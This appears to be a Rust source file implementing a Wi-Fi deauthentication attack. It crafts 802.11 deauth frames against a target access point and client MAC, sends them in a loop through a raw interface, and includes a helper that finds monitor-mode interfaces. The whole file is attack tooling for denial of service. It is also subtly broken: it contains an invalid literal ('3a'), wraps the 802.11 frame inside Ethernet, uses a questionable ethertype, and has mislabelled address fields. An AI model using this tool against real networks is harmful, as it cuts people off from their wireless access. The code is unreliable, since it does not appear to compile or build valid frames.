use pnet::datalink::{self, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ieee80211::{self, Ieee80211Packet, MutableIeee80211Packet};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use rand::Rng;
use std::time::Duration;
use tokio::time::sleep;

pub async fn deauth_attack(interface_name: &str, target_bssid: &str, client_mac: &str, packets: usize) {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
        .find(|iface| iface.name == interface_name)
        .expect("Interface not found");

    let (_tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating channel: {}", e),
    };

    let target_bssid = target_bssid.parse::<MacAddr>().unwrap();
    let client_mac = client_mac.parse::<MacAddr>().unwrap();
    let my_mac: MacAddr = rand::thread_rng().gen();

    for i in 0..packets {
        let mut rng = rand::thread_rng();
        
        // Craft 802.11 Deauth frame (Management frame, subtype 12)
        let deauth_frame = ieee80211::Ieee80211Packet::new(&[
            0xc0, 0x00, 3a, 0x01,  // Frame Control: Deauth (0xc0), From DS
            rng.gen(), rng.gen(),  // Duration
            target_bssid.octets()[0], target_bssid.octets()[1], target_bssid.octets()[2],
            target_bssid.octets()[3], target_bssid.octets()[4], target_bssid.octets()[5],  // Receiver (AP)
            client_mac.octets()[0], client_mac.octets()[1], client_mac.octets()[2],
            client_mac.octets()[3], client_mac.octets()[4], client_mac.octets()[5],  // Transmitter (Client)
            my_mac.octets()[0], my_mac.octets()[1], my_mac.octets()[2],
            my_mac.octets()[3], my_mac.octets()[4], my_mac.octets()[5],  // BSSID
            0,0,0,0,0,0,0,0,  // Sequence control + reason (unspecified)
            0,0  // FCS (placeholder)
        ]).unwrap();

        // Wrap in Ethernet (Radiotap omitted for raw injection)
        let mut eth_buffer = [0u8; 1514];
        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer).unwrap();
        eth_packet.set_destination(target_bssid);
        eth_packet.set_source(my_mac);
        eth_packet.set_ethertype(EtherTypes::Ieee80211);
        eth_packet.set_payload(deauth_frame.packet());

        if let Err(e) = _tx.send_to(&eth_packet.packet(), None) {
            eprintln!("Send error: {}", e);
        }

        println!("[DEAUTH] Packet {}/{} -> BSSID: {}, Client: {}", i+1, packets, target_bssid, client_mac);
        sleep(Duration::from_millis(10)).await;  // Rate limit
    }
}

// Monitor mode interface finder (for USB WiFi)
pub fn find_wifi_interfaces() -> Vec<String> {
    datalink::interfaces()
        .into_iter()
        .filter(|iface| iface.name.contains("wlan") || iface.name.contains("mon"))
        .map(|iface| iface.name)
        .collect()
  }
